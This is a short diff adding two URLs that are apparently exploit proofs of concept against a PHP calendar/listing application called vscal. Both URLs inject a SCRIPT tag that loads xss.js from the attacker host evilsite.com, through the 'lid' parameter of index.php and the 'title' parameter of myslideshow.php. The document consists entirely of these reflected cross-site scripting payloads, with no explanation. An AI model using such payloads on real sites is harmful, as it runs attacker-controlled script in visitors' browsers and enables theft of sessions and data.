@@ -1,0 +1,2 @@
+http://www.example.com/vscal/index.php?page=showlisting&amp;lid=&lt;SCRIPT%20SRC=evilsite.com//xss.js&gt;&lt;/SCRIPT&gt;
+http://www.example.com/vscal/myslideshow.php?dir=./listings/317/images/&amp;title=listing+317:+1966+Buick+&lt;SCRIPT%20SRC=http://evilsite.com/xss.js&gt;&lt;/SCRIPT&gt;
